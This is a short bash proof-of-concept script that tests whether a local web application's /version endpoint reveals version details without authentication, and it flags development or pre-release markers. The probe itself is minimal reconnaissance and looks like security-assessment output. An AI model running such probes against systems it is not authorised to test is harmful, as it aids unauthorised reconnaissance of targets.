#!/bin/bash

# POC: Application Version Information Disclosure
# Target: http://localhost:2280/version
# Description: Demonstrates that version information is exposed without authentication

TARGET_URL="http://localhost:2280/version"
TIMEOUT=10

echo "[*] Testing Version Information Disclosure Vulnerability"
echo "[*] Target: $TARGET_URL"
echo ""

# Test 1: Unauthenticated access to /version endpoint
echo "[TEST 1] Attempting unauthenticated access to /version endpoint..."
RESPONSE=$(curl -s -w "\n%{http_code}" -m $TIMEOUT "$TARGET_URL" 2>&1)
HTTP_CODE=$(echo "$RESPONSE" | tail -n 1)
BODY=$(echo "$RESPONSE" | sed '$d')

echo "HTTP Status Code: $HTTP_CODE"
echo "Response Body:"
echo "$BODY"
echo ""

# Verify the vulnerability
if [ "$HTTP_CODE" = "200" ]; then
    echo "[+] VULNERABLE: Version endpoint is accessible without authentication"
    echo "[+] HTTP 200 response received"
    
    # Check if response contains version information
    if echo "$BODY" | grep -q "version"; then
        VERSION=$(echo "$BODY" | grep -o '"version":"[^"]*"')
        echo "[+] Version information disclosed: $VERSION"
        
        # Check for development indicators
        if echo "$VERSION" | grep -q "dev\|beta\|alpha\|0\.0\.0"; then
            echo "[!] WARNING: Development/pre-release version indicator detected"
            echo "[!] This reveals development status to unauthenticated users"
        fi
        
        echo ""
        echo "[RESULT] VULNERABILITY CONFIRMED"
        exit 0
    else
        echo "[!] Response received but no version field found"
        exit 1
    fi
elif [ "$HTTP_CODE" = "404" ]; then
    echo "[-] Endpoint not found (404)"
    exit 1
elif [ "$HTTP_CODE" = "401" ] || [ "$HTTP_CODE" = "403" ]; then
    echo "[-] Not vulnerable: Authentication required (HTTP $HTTP_CODE)"
    exit 1
else
    echo "[-] Unexpected HTTP status: $HTTP_CODE"
    exit 1
fi